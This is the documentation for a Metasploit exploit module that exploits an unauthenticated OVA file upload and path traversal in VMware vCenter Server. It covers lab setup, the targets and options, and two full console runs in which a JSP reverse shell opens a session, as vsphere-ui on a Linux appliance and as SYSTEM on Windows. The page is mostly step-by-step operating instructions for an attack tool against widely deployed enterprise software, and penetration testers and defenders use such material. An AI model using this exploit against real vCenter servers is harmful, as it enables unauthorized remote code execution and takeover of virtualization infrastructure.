## Vulnerable Application

### Description

This module exploits an unauthenticated OVA file upload and path
traversal in VMware vCenter Server to write a JSP payload to a
web-accessible directory.

Fixed versions are 6.5 Update 3n, 6.7 Update 3l, and 7.0 Update 1c.
Note that later vulnerable versions of the Linux appliance aren't
exploitable via the webshell technique. Furthermore, writing an SSH
public key to `/home/vsphere-ui/.ssh/authorized_keys` works, but the
user's non-existent password expires 90 days after install, rendering
the technique nearly useless against production environments.

You'll have the best luck targeting older versions of the Linux
appliance. The Windows target should work ubiquitously.

### Setup

Follow [VMware's official
documentation](https://docs.vmware.com/en/VMware-vSphere/6.7/com.vmware.vcenter.install.doc/GUID-8DC3866D-5087-40A2-8067-1361A2AF95BD.html)
on installing and configuring vCenter Server, or you can wing it like
me. The Linux appliance is meant to be deployed via ESXi, but I
short-circuited the procedure by mounting the ISO and importing the OVA
directly into VMware Fusion (or your desired hypervisor). YMMV.

```
wvu@kharak:~/Downloads$ hdiutil attach VMware-VCSA-all-6.7.0-11726888.iso
/dev/disk2          	                               	/Volumes/VMware VCSA
wvu@kharak:~/Downloads$ ls -l /Volumes/VMware\ VCSA/vcsa
total 4621748
-r-xr-xr-x  1 wvu  staff  2366330368 Jan 10  2019 VMware-vCenter-Server-Appliance-6.7.0.21000-11726888_OVF10.ova
dr-xr-xr-x  5 wvu  staff        2048 Jan 10  2019 ovftool
-r-xr-xr-x  1 wvu  staff          52 Jan 10  2019 version.txt
wvu@kharak:~/Downloads$
```

If you're using the workaround above, you'll need to connect to HTTPS
port 5480 to complete [Stage
2](https://docs.vmware.com/en/VMware-vSphere/6.7/com.vmware.vcenter.install.doc/GUID-CA114526-A413-4219-9FA7-F5A9E9ACA357.html)
of the faux deployment. You may need to set a root password in the
console first. The vSphere Client should be accessible on port 443 after
Stage 2 is complete.

You'll want to test versions earlier than 6.7 Update 3l, since that's
patched. Later vulnerable versions of the Linux appliance aren't
exploitable via the webshell technique. I haven't been able to download
and test them all. Sorry.

**Note:** If you're testing on Windows, using Windows Server 2019 will
fail miserably. Please use [Windows Server 2016 or
earlier](https://kb.vmware.com/s/article/2091273). It must be Windows
Server. I can't stress this enough!

**PROTIP:** Removing or otherwise disabling DNS resolution in the Linux
appliance will make setup run faster if you don't have an FQDN and DNS
server to back it up. This didn't seem to make a difference on Windows.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This targets the Linux appliance with a JSP payload. `VMware vCenter
Server <= 6.7 Update 1b (Linux)` is supported.

### 1

This targets the Windows install with a JSP payload. `VMware vCenter
Server <= 6.7 Update 3j (Windows)` is supported.

## Options

### SprayAndPrayMin

Spray JSP payload path starting at this index.

### SprayAndPrayMax

Spray JSP payload path stopping at this index.

## Scenarios

### VMware vCenter Server 6.7 Update 1b (Linux appliance)

```
msf6 > use exploit/multi/http/vmware_vcenter_uploadova_rce
[*] Using configured payload java/jsp_shell_reverse_tcp
msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > options

Module options (exploit/multi/http/vmware_vcenter_uploadova_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   VMware vCenter Server <= 6.7 Update 1b (Linux)


msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > set rhosts 192.168.123.135
rhosts => 192.168.123.135
msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Using auxiliary/scanner/vmware/esx_fingerprint as check
[+] 192.168.123.135:443 - Identified VMware vCenter Server 6.7.0 build-11727113
[*] Scanned 1 of 1 hosts (100% complete)
[+] The target is vulnerable. Unauthenticated endpoint access granted.
[*] Uploading OVA file: O2qAd1Y7t0bhyUQFJ32Vyre6TQHcGoun.ova
[+] Successfully uploaded OVA file
[*] Requesting JSP payload: https://192.168.123.135/ui/resources/gVh2ROzD9QyyGNF6.jsp
[+] Successfully requested JSP payload
[*] Command shell session 1 opened (192.168.123.1:4444 -> 192.168.123.135:55342) at 2021-03-05 16:49:05 -0600
[+] Deleted /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/gVh2ROzD9QyyGNF6.jsp
[+] Deleted /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/40/0/h5ngc.war/resources/gVh2ROzD9QyyGNF6.jsp

id
uid=1016(vsphere-ui) gid=100(users) groups=100(users),59001(cis)
uname -a
Linux photon-machine 4.4.161-1.ph1 #1-photon SMP Wed Oct 17 12:15:18 UTC 2018 x86_64 GNU/Linux
^Z
Background session 1? [y/N]  y
```

### VMware vCenter Server 6.7 Update 3j on Windows Server 2016

```
msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > set target 1
target => 1
msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > set rhosts 192.168.123.194
rhosts => 192.168.123.194
msf6 exploit(multi/http/vmware_vcenter_uploadova_rce) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Using auxiliary/scanner/vmware/esx_fingerprint as check
[+] 192.168.123.194:443 - Identified VMware vCenter Server 6.7.0 build-16709044
[*] Scanned 1 of 1 hosts (100% complete)
[+] The target is vulnerable. Unauthenticated endpoint access granted.
[*] Uploading OVA file: 0ggORbkxAcptUeH6U5S8.ova
[+] Successfully uploaded OVA file
[*] Requesting JSP payload: https://192.168.123.194/statsreport/UQbpAxH7WTmrzqcb7AugtYnMB2z0.jsp
[+] Successfully requested JSP payload
[*] Command shell session 2 opened (192.168.123.1:4444 -> 192.168.123.194:55411) at 2021-03-05 16:50:29 -0600
[!] Tried to delete /ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/UQbpAxH7WTmrzqcb7AugtYnMB2z0.jsp, unknown result


C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin>whoami
whoami
nt authority\system

C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin>
```
